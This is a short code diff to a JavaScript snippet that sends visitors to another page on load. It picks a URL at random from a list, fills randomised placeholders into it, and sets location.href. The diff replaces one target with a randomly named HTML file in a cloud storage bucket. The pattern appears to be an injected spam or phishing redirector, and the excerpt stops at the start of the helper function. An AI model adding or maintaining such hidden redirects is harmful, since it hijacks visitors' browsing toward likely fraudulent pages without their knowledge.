@@ -1,5 +1,5 @@
 var urls=[
-' https://applet.beautyisp.com/profile/upload/2024/06/22/12.html#{nnnnnnn}{wwww}',
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/b58984fe03494de88a77b26863daf764.html#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
